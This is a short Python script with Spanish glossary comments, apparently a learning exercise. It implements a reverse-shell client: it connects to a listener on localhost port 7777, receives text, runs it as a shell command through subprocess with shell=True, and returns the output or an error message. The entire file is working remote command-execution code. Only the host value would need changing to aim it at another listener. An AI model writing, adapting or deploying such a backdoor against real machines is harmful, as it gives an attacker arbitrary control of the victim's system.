#!/usr/bin/env python
#_*_ coding: utf8 _*_

#--GLOSARIO--#
'''
    (socket.send) :se utiliza para enviar  paquetes atravez de la ruta y el puerto especificado {!!Se debe mandar de forma binaria: b"ejemplo" o ejemplo.encode()}
    (subprocess.Popen) : sentencia que crea y maneja procesos subyacentes
    (ejemplo.decode) : es un atributo que se utiliza para convertir texto binario a un string, tiene dos paramentros: la codificacion y el error
'''
#--GLOSARIO--#
from distutils.log import error
import socket
import subprocess
import os

cliente = socket.socket()

cliente.connect(('localhost', 7777))
cliente.send(b"1")
try:
  while True:
        c = cliente.recv(1024)
        c = c.decode()
        comando = subprocess.Popen(c, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        respuesta = comando.stdout.read()
        ERROR = comando.stderr.read()
        if ERROR.decode() != '':
          cliente.send("*ERROR EN EL COMANDO*".encode())
        else:
          cliente.send(respuesta)
except ConnectionResetError:
    print("*ERROR")
    os.system('cls')